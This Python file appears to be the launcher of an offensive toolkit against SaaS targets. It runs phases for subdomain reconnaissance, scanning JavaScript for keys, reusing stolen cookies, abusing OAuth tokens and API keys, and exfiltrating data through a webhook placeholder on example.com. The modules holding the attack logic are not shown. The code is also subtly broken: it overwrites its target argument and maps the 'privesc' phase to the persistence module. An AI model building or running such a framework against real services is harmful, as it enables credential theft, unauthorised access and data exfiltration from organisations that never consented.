import sys
from modules import (
    recon_saas,
    saas_persistence,
    defense_evasion,
    credential_access,
    discovery,
    lateral_movement,
    exfiltration
)

def run(phase, target):
    import sys
    target = sys.argv[2] if len(sys.argv) > 2 else "example.com"
    if phase == "recon":
        import modules.recon_saas as recon
        print(recon.subdomain_enum(target))
    elif phase == "cred":
        import modules.credential_access as credential_access
        print(credential_access.scan_js_for_keys(target))
    elif phase == "discovery":
        import modules.discovery as discovery
        print(discovery.basic_discovery(target))
    elif phase == "evasion":
        import modules.defense_evasion as defense_evasion
        print(defense_evasion.use_stolen_cookie(target, "dummy_cookie"))
    elif phase == "exfil":
        import modules.exfiltration as exfiltration
        print(exfiltration.trigger_webhook_exfiltration(target, "https://example.com/webhook"))
    elif phase == "lateral":
        import modules.lateral_movement as lateral_movement
        print(lateral_movement.abuse_oauth_integration(target, "dummy_token"))
    elif phase == "privesc":
        import modules.saas_persistence as saas_persistence
        print(saas_persistence.use_api_key(target, "dummy_api_key"))
    else:
        print("Unknown phase. Use: recon, privesc, evasion, cred, discovery, lateral, exfil")
